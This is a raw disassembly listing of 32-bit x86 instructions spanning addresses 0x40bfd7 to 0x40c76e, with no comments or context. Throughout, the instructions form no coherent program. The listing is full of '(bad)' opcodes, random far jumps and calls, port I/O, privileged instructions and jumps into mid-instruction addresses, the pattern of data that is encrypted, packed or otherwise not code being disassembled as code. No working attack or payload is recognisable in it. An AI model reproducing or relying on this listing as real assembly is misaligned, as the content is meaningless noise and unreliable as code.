  40bfd7:	mov    BYTE PTR [ebp-0x25],bh
  40bfda:	sahf   
  40bfdb:	sbb    al,0xce
  40bfdd:	mov    esi,0x906a476b
  40bfe2:	pop    ds
  40bfe3:	inc    ecx
  40bfe4:	xor    DWORD PTR [esi+0x57acfe54],eax
  40bfea:	or     ebx,ebp
  40bfec:	lock frstor [edi+0x4a]
  40bff0:	inc    edx
  40bff1:	stos   BYTE PTR es:[edi],al
  40bff2:	adc    BYTE PTR fs:[ebx],dh
  40bff5:	xchg   edi,eax
  40bff6:	shl    BYTE PTR [eax-0x2a],cl
  40bff9:	mov    eax,ebp
  40bffb:	jo     0x40c01c
  40bffd:	ror    DWORD PTR [ebp-0x6c],cl
  40c000:	mov    edi,0xa9eae1f2
  40c005:	push   edx
  40c006:	inc    esp
  40c007:	xchg   esi,eax
  40c009:	ds (bad) 
  40c00b:	imul   edx,DWORD PTR [esi+0x69],0xffffffc8
  40c00f:	fmul   QWORD PTR [ebp+0x4f]
  40c012:	push   eax
  40c013:	or     edi,esp
  40c015:	daa    
  40c016:	jb     0x40bfc0
  40c018:	fisttp QWORD PTR [eax-0x1140acd4]
  40c01e:	in     al,0x48
  40c020:	ins    DWORD PTR es:[edi],dx
  40c021:	scas   eax,DWORD PTR es:[edi]
  40c022:	aas    
  40c023:	jns    0x40c097
  40c025:	ja     0x40c017
  40c027:	push   eax
  40c028:	jp     0x40bfdb
  40c02a:	dec    edx
  40c02b:	xchg   ebx,eax
  40c02c:	dec    eax
  40c02d:	mov    al,ds:0xcdb9fd6f
  40c032:	test   al,0xfd
  40c034:	clc    
  40c035:	dec    ebp
  40c036:	push   es
  40c037:	loop   0x40c03e
  40c039:	imul   eax,ecx,0x54
  40c03c:	aam    0xfb
  40c03e:	stos   BYTE PTR es:[edi],al
  40c03f:	fwait
  40c040:	popa   
  40c041:	(bad)  
  40c042:	mov    edi,0xcbe8f109
  40c047:	loop   0x40c082
  40c049:	int    0xbe
  40c04b:	cmp    al,bl
  40c04d:	mov    ds:0x135c5189,al
  40c052:	add    DWORD PTR [edi-0x4d3bcc3],ebp
  40c058:	adc    dh,BYTE PTR [eax+0x8]
  40c05b:	mov    bh,0x32
  40c05d:	(bad)  
  40c05e:	out    dx,eax
  40c05f:	mov    ch,0xc
  40c061:	xchg   edx,esp
  40c063:	jecxz  0x40c066
  40c065:	or     ebp,DWORD PTR [esi]
  40c067:	icebp  
  40c068:	jmp    0x40c094
  40c06a:	test   eax,0x1333b5dd
  40c06f:	rcl    DWORD PTR ds:0x62804830,1
  40c075:	push   ss
  40c076:	cmp    DWORD PTR [edi+0x17],0xdc9972af
  40c07d:	mov    cs,WORD PTR ss:[edi+0x4e]
  40c081:	ins    BYTE PTR es:[edi],dx
  40c082:	and    dl,BYTE PTR [eax+0x41914d15]
  40c088:	popa   
  40c089:	cs sahf 
  40c08b:	imul   DWORD PTR [eax]
  40c08d:	into   
  40c08e:	add    eax,0x65a90837
  40c093:	(bad)  
  40c094:	push   eax
  40c095:	mov    dl,0x5e
  40c097:	popfw  
  40c099:	ret    0x8cfa
  40c09c:	mov    ebx,0xeaab3e69
  40c0a1:	add    eax,0x7e098a30
  40c0a6:	pop    esi
  40c0a7:	clc    
  40c0a8:	cmp    ecx,DWORD PTR [eax+eiz*8+0x534575f9]
  40c0af:	aam    0x8e
  40c0b1:	inc    eax
  40c0b2:	into   
  40c0b3:	jmp    0x62cf:0x1e15c757
  40c0ba:	mov    ebp,0xe4f5f03a
  40c0bf:	bound  esp,QWORD PTR [edx+0x1c]
  40c0c2:	dec    eax
  40c0c3:	enter  0x8e,0xa1
  40c0c7:	pop    ds
  40c0c8:	call   0xe3ee:0xc4ca5519
  40c0cf:	gs retf 
  40c0d1:	push   0x7d
  40c0d3:	and    al,0xc9
  40c0d5:	fdiv   QWORD PTR [edi+0x6a]
  40c0d8:	popa   
  40c0d9:	icebp  
  40c0da:	sbb    DWORD PTR [ecx-0x62c0e171],ebp
  40c0e0:	xchg   edx,eax
  40c0e1:	adc    eax,0xe133541f
  40c0e6:	sub    ecx,edx
  40c0e8:	mov    ebp,0x1193c89a
  40c0ed:	inc    BYTE PTR [ebx+ebx*8]
  40c0f0:	mov    ecx,0xb5bbc511
  40c0f5:	cmc    
  40c0f6:	in     al,dx
  40c0f7:	stos   BYTE PTR es:[edi],al
  40c0f8:	scas   eax,DWORD PTR es:[edi]
  40c0f9:	mov    ds:0x2e4327df,eax
  40c0fe:	retf   0xacff
  40c101:	call   0x679488b8
  40c106:	sti    
  40c107:	or     DWORD PTR [ebx-0x18fadca8],0x70
  40c10e:	dec    eax
  40c10f:	inc    ebp
  40c110:	push   esi
  40c111:	lods   al,BYTE PTR ds:[esi]
  40c112:	mov    dl,0x6e
  40c114:	mov    ecx,0x953b5758
  40c119:	mov    bh,0x74
  40c11b:	adc    edx,DWORD PTR [edx-0x5f6251f2]
  40c121:	pop    ds
  40c122:	sbb    ecx,edi
  40c124:	xchg   esp,eax
  40c125:	(bad)  [ecx]
  40c127:	adc    edx,eax
  40c129:	sbb    DWORD PTR [ecx],0x39e73148
  40c12f:	xor    al,0xb8
  40c131:	test   eax,0xd70c274e
  40c136:	adc    BYTE PTR [edx+0x77eca98b],bh
  40c13c:	mov    eax,ds:0xa2e16de2
  40c141:	scas   eax,DWORD PTR es:[edi]
  40c142:	popa   
  40c143:	push   esp
  40c144:	dec    edx
  40c145:	jmp    0x382b:0x97c77992
  40c14c:	xor    eax,0x30d1ebf6
  40c151:	retf   
  40c152:	inc    ecx
  40c153:	jmp    0xb504:0x776ee048
  40c15a:	and    bl,BYTE PTR [ecx+0x19f6e6c3]
  40c160:	and    al,0x3a
  40c162:	call   0x9dd7:0x4ac9c6e2
  40c169:	test   DWORD PTR [eax-0xaf91eca],edi
  40c16f:	loop   0x40c171
  40c171:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c172:	dec    ecx
  40c173:	cs sbb eax,0x4c98cf3c
  40c179:	jg     0x40c189
  40c17b:	mov    cl,BYTE PTR [edx]
  40c17d:	ja     0x40c18b
  40c17f:	retf   
  40c180:	lahf   
  40c181:	adc    bl,BYTE PTR [esi+eax*1]
  40c184:	mov    ds:0x7c7a742a,eax
  40c189:	scas   al,BYTE PTR es:[edi]
  40c18a:	inc    DWORD PTR [edx-0x34]
  40c18d:	out    dx,al
  40c18e:	inc    esi
  40c18f:	mov    ecx,0x9b576eb
  40c194:	inc    eax
  40c195:	sbb    dh,BYTE PTR [edi-0x59b6d9ed]
  40c19b:	dec    ecx
  40c19c:	pushf  
  40c19d:	clc    
  40c19e:	in     eax,0x38
  40c1a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c1a1:	in     eax,0x5
  40c1a3:	cmp    edx,DWORD PTR [ebx-0x47ba2baa]
  40c1a9:	sub    edx,DWORD PTR [esi]
  40c1ab:	mov    ebx,0x3f932b62
  40c1b0:	repnz and BYTE PTR [edi+0x51a89097],ch
  40c1b7:	add    eax,0x49a9a623
  40c1bc:	mov    DWORD PTR [eax-0xf264db1],esp
  40c1c2:	std    
  40c1c3:	jbe    0x40c21c
  40c1c5:	dec    esp
  40c1c6:	(bad)  
  40c1c7:	imul   eax,DWORD PTR [eax-0x679b0367],0xffffff9c
  40c1ce:	(bad)  
  40c1cf:	jl     0x40c1a8
  40c1d1:	dec    DWORD PTR [ebx-0x4]
  40c1d4:	mov    eax,ds:0xb41bb409
  40c1d9:	into   
  40c1da:	sbb    al,0x34
  40c1dc:	mov    dl,0x49
  40c1de:	cmp    bl,bh
  40c1e0:	mov    edi,0xf3b34065
  40c1e5:	ss es cli 
  40c1e8:	and    al,ch
  40c1ea:	cmc    
  40c1eb:	pop    ss
  40c1ec:	cmp    esi,DWORD PTR [edi-0x4]
  40c1ef:	or     eax,DWORD PTR [eax+ebp*4-0x24]
  40c1f3:	mov    ch,0xce
  40c1f5:	cs stos DWORD PTR es:[edi],eax
  40c1f7:	mov    BYTE PTR [ebx+0x59],ch
  40c1fa:	call   0xef9a59e5
  40c1ff:	pop    ecx
  40c200:	inc    ebp
  40c201:	dec    esi
  40c202:	cmp    BYTE PTR [eax+0x57516f50],al
  40c208:	mov    eax,0xce373ff5
  40c20d:	jns    0x40c1c3
  40c20f:	mov    ds:0xe50688b4,al
  40c214:	in     al,0xdb
  40c216:	mov    cl,0xa2
  40c218:	ins    BYTE PTR es:[edi],dx
  40c219:	cmp    al,0x8f
  40c21b:	dec    ebp
  40c21c:	cmp    eax,0x9e06639b
  40c221:	(bad)  
  40c222:	or     BYTE PTR [edx-0x6d42958a],0x68
  40c229:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c22a:	(bad)  
  40c22b:	pop    ebx
  40c22c:	arpl   WORD PTR [ecx+0x33ae7e74],sp
  40c232:	inc    edi
  40c233:	mov    ds:0xb5863271,al
  40c238:	mov    DWORD PTR fs:[ebx-0x618414ed],esi
  40c23f:	out    0x13,al
  40c241:	outs   dx,BYTE PTR ds:[esi]
  40c242:	sti    
  40c243:	push   ss
  40c244:	sti    
  40c245:	and    eax,eax
  40c247:	scas   eax,DWORD PTR es:[edi]
  40c248:	mov    esp,DWORD PTR ds:0x8553a013
  40c24e:	push   es
  40c24f:	bound  esp,QWORD PTR ds:0xe9934c8c
  40c255:	out    0x2f,eax
  40c257:	xor    eax,0x63182d21
  40c25c:	sub    ch,dh
  40c25e:	mov    dh,0x5a
  40c260:	xchg   esp,eax
  40c261:	cmp    ebx,0x973618a6
  40c267:	pop    esi
  40c268:	dec    esi
  40c269:	mov    ?,WORD PTR [esi+0x25b8ee5b]
  40c26f:	and    eax,0x67ad4345
  40c274:	cmp    eax,0x9b5901b0
  40c279:	pop    es
  40c27a:	fbstp  TBYTE PTR [edx-0x69]
  40c27d:	inc    eax
  40c27e:	xor    ebx,DWORD PTR [eax-0x264c6182]
  40c284:	data16 mov bh,BYTE PTR [edx+0x42]
  40c288:	add    al,BYTE PTR gs:[esi-0x5c]
  40c28c:	jge    0x40c295
  40c28e:	pop    ecx
  40c28f:	mov    bh,BYTE PTR [esi+eax*8-0x30]
  40c293:	inc    ebx
  40c294:	pushf  
  40c295:	adc    eax,eax
  40c297:	in     eax,0x92
  40c299:	sti    
  40c29a:	adc    esp,edi
  40c29c:	pop    esp
  40c29d:	pop    edx
  40c29e:	add    DWORD PTR [eax-0x7],ecx
  40c2a1:	sbb    eax,0x76925137
  40c2a6:	push   edi
  40c2a7:	mov    dl,0xab
  40c2a9:	xor    DWORD PTR [edi+esi*1+0x9],ecx
  40c2ad:	sbb    al,0xf8
  40c2af:	mov    ah,0xf9
  40c2b1:	jge    0x40c32c
  40c2b3:	push   0x3a
  40c2b5:	push   esp
  40c2b6:	sbb    edi,DWORD PTR [ebx]
  40c2b8:	rcl    DWORD PTR [ebp+0x1a28f4d],0xbc
  40c2bf:	adc    DWORD PTR [eax],esp
  40c2c1:	imul   eax,DWORD PTR [ebp-0x51],0xa
  40c2c5:	sbb    eax,DWORD PTR [edx+0xa609dc9]
  40c2cb:	push   esp
  40c2cc:	sub    edx,esi
  40c2ce:	push   esp
  40c2cf:	jo     0x40c2a8
  40c2d1:	cmc    
  40c2d2:	cwde   
  40c2d3:	mov    dh,0x26
  40c2d5:	ret    
  40c2d6:	add    al,0xe3
  40c2d8:	(bad)  
  40c2da:	stc    
  40c2db:	dec    BYTE PTR [ecx-0x5fac8614]
  40c2e1:	xor    DWORD PTR gs:[eax-0x4],edi
  40c2e5:	loopne 0x40c313
  40c2e7:	adc    esi,DWORD PTR [ebp+0x4f]
  40c2ea:	out    0xcd,al
  40c2ec:	pop    ebx
  40c2ed:	lods   eax,DWORD PTR ds:[esi]
  40c2ee:	inc    esi
  40c2ef:	dec    edi
  40c2f0:	daa    
  40c2f1:	fcmove st,st(7)
  40c2f3:	scas   eax,DWORD PTR es:[edi]
  40c2f4:	shl    BYTE PTR [edx+0x34],0x7b
  40c2f8:	mov    dl,0x8
  40c2fa:	xchg   ebx,eax
  40c2fb:	inc    edx
  40c2fc:	lahf   
  40c2fd:	das    
  40c2fe:	xchg   DWORD PTR [eax-0x5d87f3f1],ebp
  40c304:	dec    ebx
  40c305:	and    eax,0x5a27bc56
  40c30a:	mov    ds:0x5a6fe646,eax
  40c30f:	pop    esi
  40c310:	div    DWORD PTR [edi-0x5d2831f9]
  40c316:	sub    eax,0x59218871
  40c31b:	dec    ecx
  40c31c:	je     0x40c337
  40c31e:	repnz push ecx
  40c320:	loopne 0x40c318
  40c322:	add    BYTE PTR [esi-0x12],al
  40c325:	cmp    ebp,ebp
  40c327:	mov    ds:0x77768896,al
  40c32c:	rcl    eax,0x9c
  40c32f:	mov    ds:0xfd0323c1,al
  40c334:	scas   eax,DWORD PTR es:[edi]
  40c335:	xor    dl,BYTE PTR [ecx]
  40c337:	retf   0xa23f
  40c33a:	or     BYTE PTR ds:0xd5b0db30,0xbe
  40c341:	sub    al,0x2f
  40c343:	inc    ebp
  40c344:	jae    0x40c2d1
  40c346:	pop    edx
  40c347:	jp     0x40c2f2
  40c349:	xchg   ebx,eax
  40c34a:	into   
  40c34b:	mov    ebx,0x49675413
  40c350:	shl    edx,cl
  40c352:	pop    ebx
  40c353:	loope  0x40c2ee
  40c355:	push   ebp
  40c356:	add    al,0xc5
  40c358:	sbb    BYTE PTR [ebp-0x65fe9707],ah
  40c35e:	bound  edi,QWORD PTR [ebp+0x6f45da47]
  40c364:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c365:	mov    ah,0x1c
  40c367:	pop    es
  40c368:	scas   eax,DWORD PTR es:[edi]
  40c369:	into   
  40c36a:	out    0x19,al
  40c36c:	mov    dh,0x41
  40c36e:	shl    ch,cl
  40c370:	sti    
  40c371:	xchg   esp,eax
  40c372:	call   0x8fee:0xd74f9bd9
  40c379:	imul   eax,DWORD PTR [esi-0x13],0xffffffcf
  40c37d:	std    
  40c37e:	sub    eax,0xc9f6d6ea
  40c383:	loopne 0x40c347
  40c385:	popa   
  40c386:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c387:	jns    0x40c31c
  40c389:	jl     0x40c3d6
  40c38b:	jb     0x40c3eb
  40c38d:	ins    DWORD PTR es:[edi],dx
  40c38e:	push   0x62
  40c390:	cli    
  40c391:	(bad)  
  40c392:	enter  0x125f,0x9e
  40c396:	(bad)  [ebx]
  40c398:	call   0x6e4b:0x152cbaa7
  40c39f:	or     BYTE PTR [esi],0xad
  40c3a2:	push   ds
  40c3a3:	adc    DWORD PTR [edx],ebp
  40c3a5:	call   0xc2372476
  40c3aa:	out    0x3d,al
  40c3ac:	add    BYTE PTR [ecx],dl
  40c3ae:	pop    ebp
  40c3af:	stc    
  40c3b0:	add    BYTE PTR [ecx],0xc5
  40c3b3:	inc    ecx
  40c3b4:	pop    esi
  40c3b5:	icebp  
  40c3b6:	test   BYTE PTR [eax-0x2d5330c6],0xb8
  40c3bd:	xchg   edx,eax
  40c3be:	je     0x40c3da
  40c3c0:	fldl2e 
  40c3c2:	aam    0x8f
  40c3c4:	sbb    al,0x6f
  40c3c6:	and    BYTE PTR [ebx],al
  40c3c8:	push   edi
  40c3c9:	adc    BYTE PTR [edx],ch
  40c3cb:	(bad)  
  40c3cc:	dec    edi
  40c3cd:	gs mov edx,0x778197a9
  40c3d3:	cmp    cl,BYTE PTR fs:[ebp-0x60]
  40c3d7:	sbb    esi,DWORD PTR [ecx]
  40c3d9:	mov    edx,0x546d04be
  40c3de:	adc    al,0xe9
  40c3e0:	mov    ah,0x97
  40c3e2:	adc    ch,bh
  40c3e4:	clc    
  40c3e5:	inc    ecx
  40c3e6:	popa   
  40c3e7:	sbb    al,0x37
  40c3e9:	scas   al,BYTE PTR es:[edi]
  40c3ea:	jmp    0x40c420
  40c3ec:	rcr    ebx,cl
  40c3ee:	inc    edx
  40c3ef:	enter  0xab7e,0x5
  40c3f3:	ret    
  40c3f4:	adc    eax,0x635ab4ee
  40c3f9:	fwait
  40c3fa:	and    al,0x5a
  40c3fc:	cmc    
  40c3fd:	dec    esi
  40c3fe:	xchg   ebp,eax
  40c3ff:	mov    bh,0x9c
  40c401:	add    esp,DWORD PTR [edx-0x14]
  40c404:	cwde   
  40c405:	and    eax,DWORD PTR [esi+0x688476]
  40c40b:	mov    dh,0xcb
  40c40d:	push   ebp
  40c40e:	std    
  40c40f:	es jns 0x40c399
  40c412:	cs out dx,eax
  40c414:	out    0xa6,al
  40c416:	add    DWORD PTR [edx+0x7bb323b],ebp
  40c41c:	clc    
  40c41d:	sub    esi,DWORD PTR [esp+ecx*4-0x53]
  40c421:	xchg   edx,eax
  40c422:	xchg   edi,eax
  40c423:	ins    BYTE PTR es:[edi],dx
  40c424:	mov    edx,DWORD PTR [ebx]
  40c426:	inc    ebx
  40c427:	jle    0x40c426
  40c429:	pop    ebx
  40c42a:	pop    ds
  40c42b:	test   DWORD PTR [ebp+0x15],eax
  40c42e:	stos   BYTE PTR es:[edi],al
  40c42f:	adc    ch,cl
  40c431:	add    dl,BYTE PTR [edx]
  40c433:	ss fwait
  40c435:	adc    ebp,edx
  40c437:	test   esp,esp
  40c439:	aad    0x78
  40c43b:	std    
  40c43c:	pop    edx
  40c43d:	sub    edi,edx
  40c43f:	lea    esp,[eax+0x2852009a]
  40c445:	test   eax,0xd7ba89a8
  40c44a:	mov    BYTE PTR [ebx-0x7278fc9c],dh
  40c450:	mov    al,0x1d
  40c452:	inc    ecx
  40c453:	gs or  ebx,ebx
  40c456:	jns    0x40c4a6
  40c458:	xchg   DWORD PTR [edx+0x76],eax
  40c45b:	mov    ebp,0xb3850871
  40c460:	(bad)  
  40c462:	inc    edx
  40c463:	mov    cl,0x73
  40c465:	aas    
  40c466:	pop    edx
  40c467:	daa    
  40c468:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c469:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c46a:	cli    
  40c46b:	call   0xbbc0:0x2f2fe3df
  40c472:	jbe    0x40c3f5
  40c474:	sbb    al,0x83
  40c476:	dec    esp
  40c477:	jl     0x40c40d
  40c479:	dec    ecx
  40c47a:	push   edx
  40c47b:	out    0xec,eax
  40c47d:	test   esp,esp
  40c47f:	pop    esp
  40c480:	ret    
  40c481:	jae    0x40c486
  40c483:	pop    ecx
  40c484:	mov    dh,0x1b
  40c486:	mov    esi,0xe4081b6f
  40c48b:	cmc    
  40c48c:	call   0x1081b30d
  40c491:	adc    ch,BYTE PTR [edx+ecx*2+0x58d44840]
  40c498:	aad    0xc4
  40c49a:	adc    eax,0xab319869
  40c49f:	mov    ss,WORD PTR [eax+0x5a]
  40c4a2:	ret    0x2a48
  40c4a5:	nop
  40c4a6:	outs   dx,BYTE PTR ds:[esi]
  40c4a7:	dec    ebp
  40c4a8:	jae    0x40c45b
  40c4aa:	mov    edi,0x263b6e37
  40c4af:	jl     0x40c432
  40c4b1:	xor    eax,0x83a0350d
  40c4b6:	push   cs
  40c4b7:	fcomp  QWORD PTR es:[eax+ebp*8+0x6b]
  40c4bc:	push   es
  40c4bd:	out    0x4d,eax
  40c4bf:	ss or  al,0xef
  40c4c2:	and    ebp,DWORD PTR [ecx]
  40c4c4:	pop    ebx
  40c4c5:	and    al,0x1a
  40c4c7:	out    dx,eax
  40c4c8:	mov    ah,0xcd
  40c4ca:	adc    bl,al
  40c4cc:	outs   dx,BYTE PTR ds:[esi]
  40c4cd:	mov    ds,WORD PTR cs:[esi+0x3f]
  40c4d1:	mov    ecx,0x17523a43
  40c4d6:	pushf  
  40c4d7:	add    ebx,DWORD PTR [edi-0x5b]
  40c4da:	inc    esp
  40c4db:	pop    ds
  40c4dc:	mov    ebp,0x5eaa7ee0
  40c4e1:	lods   eax,DWORD PTR ds:[esi]
  40c4e2:	daa    
  40c4e3:	push   0x93c0a6c2
  40c4e8:	add    ecx,DWORD PTR [ecx+0x26]
  40c4eb:	mov    esp,0x1b520fe3
  40c4f0:	retf   
  40c4f1:	adc    BYTE PTR [ebp+0x573dface],0x50
  40c4f8:	loope  0x40c47b
  40c4fa:	out    0xa,al
  40c4fc:	inc    ecx
  40c4fd:	jmp    0x1029c171
  40c502:	mov    esi,0xbf080a44
  40c507:	stos   BYTE PTR es:[edi],al
  40c508:	sub    BYTE PTR [ebp+ebp*4-0xf],ah
  40c50c:	jae    0x40c55a
  40c50e:	fidivr DWORD PTR [ecx-0x33]
  40c511:	sbb    ch,bh
  40c513:	jle    0x40c4f4
  40c515:	adc    eax,0xdd402f35
  40c51a:	test   ah,dl
  40c51c:	rcl    BYTE PTR [ecx+0x30],cl
  40c51f:	mov    bl,0xc9
  40c521:	stc    
  40c522:	xchg   edx,eax
  40c523:	mov    bl,0x66
  40c525:	lea    eax,[ebp+0x72c41e3]
  40c52b:	adc    al,bl
  40c52d:	pop    edi
  40c52e:	cwde   
  40c52f:	cli    
  40c530:	pop    ecx
  40c531:	xor    ah,BYTE PTR [edi-0x6a]
  40c534:	loope  0x40c4f0
  40c536:	lock jg 0x40c55f
  40c539:	xchg   ecx,eax
  40c53a:	leave  
  40c53b:	mov    cl,BYTE PTR [edx+0x4d2b357b]
  40c541:	(bad)  
  40c543:	xlat   BYTE PTR ds:[ebx]
  40c544:	mov    al,0xbe
  40c546:	push   es
  40c547:	pop    esi
  40c548:	lds    esi,FWORD PTR [edi+0xa]
  40c54b:	retf   0xe8ae
  40c54e:	retf   0xd64e
  40c551:	(bad)  
  40c552:	(bad)  
  40c553:	sbb    bh,BYTE PTR [eax+0x40]
  40c556:	mov    eax,ds:0xd6db0acf
  40c55b:	sub    DWORD PTR [ecx+0x3f5a26f],esi
  40c561:	jg     0x40c53a
  40c563:	shl    BYTE PTR [ebp-0x7e12248e],cl
  40c569:	leave  
  40c56a:	mov    bh,0xb6
  40c56c:	repnz cmp al,0xec
  40c56f:	inc    ecx
  40c570:	pushf  
  40c571:	ror    DWORD PTR ds:0x7689060a,1
  40c577:	sbb    DWORD PTR [edi],ebx
  40c579:	xor    ch,cl
  40c57b:	in     al,dx
  40c57c:	xor    bh,BYTE PTR [ebp-0x7444268a]
  40c582:	adc    DWORD PTR [ebx+0x2d],ebp
  40c585:	cwde   
  40c586:	cmp    BYTE PTR [esi-0x6f],al
  40c589:	call   0xb729:0xd1fc85f6
  40c590:	sub    BYTE PTR [edx],bh
  40c592:	ins    BYTE PTR es:[edi],dx
  40c593:	int3   
  40c594:	dec    ecx
  40c595:	cmp    al,0x65
  40c597:	cs lahf 
  40c599:	hlt    
  40c59a:	sbb    ecx,DWORD PTR [ecx+0x48]
  40c59d:	mov    edx,0x39fb7db7
  40c5a2:	inc    esi
  40c5a3:	mov    dh,0xf6
  40c5a5:	mov    eax,ds:0x7604373f
  40c5aa:	out    0xe5,al
  40c5ac:	js     0x40c5ae
  40c5ae:	fidiv  DWORD PTR [esi+edx*4]
  40c5b1:	test   edx,0x345aa9bb
  40c5b7:	xor    BYTE PTR [ecx+esi*4-0x46b8050b],ah
  40c5be:	lea    ebp,[ecx-0x4d]
  40c5c1:	jp     0x40c629
  40c5c3:	sub    ah,BYTE PTR [ecx-0x5e203570]
  40c5c9:	xchg   ebx,eax
  40c5ca:	jg     0x40c595
  40c5cc:	cdq    
  40c5cd:	retf   0x669d
  40c5d0:	retf   0x6d03
  40c5d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c5d5:	pushf  
  40c5d6:	jns    0x40c5d8
  40c5d8:	pop    edi
  40c5d9:	ficom  WORD PTR es:[edx]
  40c5dc:	push   ebp
  40c5dd:	rol    DWORD PTR ds:0x329ad13,cl
  40c5e3:	cmp    ch,BYTE PTR [ecx*4-0x68bfe077]
  40c5ea:	imul   ebp,DWORD PTR [edx+ecx*8],0x6c
  40c5ee:	ins    BYTE PTR es:[edi],dx
  40c5ef:	xor    eax,edi
  40c5f1:	xor    eax,0xc863ba39
  40c5f6:	add    BYTE PTR [ebp-0x50],dl
  40c5f9:	stos   DWORD PTR es:[edi],eax
  40c5fa:	dec    edi
  40c5fb:	mov    ah,0xa
  40c5fd:	push   ds
  40c5fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c5ff:	ss pushf 
  40c601:	fcom   QWORD PTR [ecx]
  40c603:	adc    BYTE PTR [eax-0x21],bl
  40c606:	pop    ds
  40c607:	aad    0x79
  40c609:	mov    ah,0xb
  40c60b:	pushf  
  40c60c:	nop
  40c60d:	test   dl,0x85
  40c610:	cmc    
  40c611:	xor    dh,dl
  40c613:	pop    ss
  40c614:	add    al,0x4e
  40c616:	add    eax,0x15bc0bde
  40c61b:	push   es
  40c61c:	not    BYTE PTR [ebp-0x48]
  40c61f:	or     eax,DWORD PTR [edi+0x3c]
  40c622:	mov    BYTE PTR [edx],bh
  40c624:	add    bh,0x2d
  40c627:	out    0xb4,al
  40c629:	aad    0x3f
  40c62b:	push   cs
  40c62c:	jbe    0x40c667
  40c62e:	les    edi,FWORD PTR [ebx+0x32a623b8]
  40c634:	xchg   esp,eax
  40c635:	push   ss
  40c636:	lods   eax,DWORD PTR ds:[esi]
  40c637:	scas   eax,DWORD PTR es:[edi]
  40c638:	inc    edx
  40c639:	jo     0x40c685
  40c63b:	lahf   
  40c63c:	adc    ebp,DWORD PTR [edx]
  40c63e:	xchg   ebx,eax
  40c63f:	fcmovbe st,st(3)
  40c641:	lahf   
  40c642:	sub    eax,0xda1b5722
  40c647:	outs   dx,DWORD PTR ds:[esi]
  40c648:	shl    DWORD PTR [ebp+0x51],0xc0
  40c64c:	sub    DWORD PTR [esp+ecx*8+0x72],edx
  40c650:	stos   DWORD PTR es:[edi],eax
  40c651:	cmp    BYTE PTR [ebx+0x47b29de9],0xf1
  40c658:	int3   
  40c659:	mov    bl,0xbd
  40c65b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c65c:	jecxz  0x40c627
  40c65e:	inc    esp
  40c65f:	xor    BYTE PTR [edx+0x70],bh
  40c662:	push   esp
  40c663:	xchg   BYTE PTR [ebx+0xbb7b917],ch
  40c669:	cli    
  40c66a:	enter  0x9818,0xfe
  40c66e:	outs   dx,BYTE PTR ds:[esi]
  40c66f:	add    eax,0xa6988517
  40c674:	push   ds
  40c675:	(bad)  
  40c676:	jo     0x40c669
  40c678:	pop    edi
  40c679:	mov    ecx,0xd1bccb07
  40c67e:	sub    edx,edx
  40c680:	nop
  40c681:	loop   0x40c691
  40c683:	cmp    eax,0x8524c7fd
  40c688:	fwait
  40c689:	mov    edx,0x750218b
  40c68e:	test   BYTE PTR cs:[ebp-0x1a8f049f],ah
  40c695:	sub    ebp,DWORD PTR [ecx+0x6b]
  40c698:	jns    0x40c6ad
  40c69a:	(bad)  
  40c69b:	(bad)  
  40c69c:	mov    eax,0xcfa42569
  40c6a1:	jnp    0x40c69b
  40c6a3:	inc    ebx
  40c6a4:	nop
  40c6a5:	not    BYTE PTR [ecx+0x9998dfb]
  40c6ab:	clc    
  40c6ac:	and    DWORD PTR ds:0xa39a073,eax
  40c6b2:	dec    ecx
  40c6b3:	in     eax,dx
  40c6b4:	popa   
  40c6b5:	(bad)  
  40c6b6:	mov    DWORD PTR [ebp-0x257c010a],ebx
  40c6bc:	mov    eax,cs:0xf21b07e3
  40c6c2:	jle    0x40c6b2
  40c6c4:	sar    BYTE PTR [ecx+0x45],1
  40c6c7:	js     0x40c6f1
  40c6c9:	sbb    eax,0x33c014fd
  40c6ce:	pop    ebp
  40c6cf:	arpl   WORD PTR [edi],di
  40c6d1:	inc    ebp
  40c6d2:	sti    
  40c6d3:	mov    ebp,0xfe703d6c
  40c6d8:	add    edx,DWORD PTR [edx]
  40c6da:	add    eax,0x125f94f4
  40c6df:	mov    dh,0x6e
  40c6e1:	fld    QWORD PTR [esi+0x25640f55]
  40c6e7:	sbb    edi,DWORD PTR [edx+0x5ad2edb3]
  40c6ed:	mov    WORD PTR ds:0xfe03c151,fs
  40c6f3:	popf   
  40c6f4:	dec    ebp
  40c6f5:	loope  0x40c748
  40c6f7:	mov    cl,0x16
  40c6f9:	push   0xc75494db
  40c6fe:	push   es
  40c6ff:	fidiv  WORD PTR [eax-0x3a50cc4e]
  40c705:	push   ss
  40c706:	fadd   QWORD PTR [ecx+0x12dc3cb3]
  40c70c:	inc    esi
  40c70d:	in     eax,0x85
  40c70f:	xchg   ebp,eax
  40c710:	rcl    BYTE PTR [edx+0x43],0xad
  40c714:	fwait
  40c715:	arpl   WORD PTR [edx+ebp*1+0x47d634d6],si
  40c71c:	mov    ebp,DWORD PTR [eax]
  40c71e:	lods   eax,DWORD PTR ds:[esi]
  40c71f:	cmp    esi,DWORD PTR ds:0xce5c35d0
  40c725:	jp     0x40c6f8
  40c727:	paddsb mm4,mm6
  40c72a:	pop    ebp
  40c72b:	and    eax,0x487c8f51
  40c730:	and    al,0x51
  40c732:	aad    0xcf
  40c734:	out    dx,eax
  40c735:	inc    edx
  40c736:	push   eax
  40c737:	sbb    ch,dl
  40c739:	js     0x40c79a
  40c73b:	sub    al,0x5e
  40c73d:	hlt    
  40c73e:	mov    ds:0x48970749,eax
  40c743:	mov    al,bl
  40c745:	sbb    BYTE PTR [edi+0x6ea46013],dh
  40c74b:	xor    BYTE PTR [ebx],dl
  40c74d:	jmp    0x59a1:0x836d58d2
  40c754:	adc    eax,0x57cbcccf
  40c759:	push   esi
  40c75a:	stc    
  40c75b:	addr16 in eax,0xb9
  40c75e:	push   eax
  40c75f:	push   ecx
  40c760:	xor    al,0x73
  40c762:	lea    edi,[edx]
  40c764:	jae    0x40c768
  40c766:	add    al,0x80
  40c768:	mov    WORD PTR ds:0x7ba5fafb,?
  40c76e:	mov    DWORD PTR [eax+0x5],eax
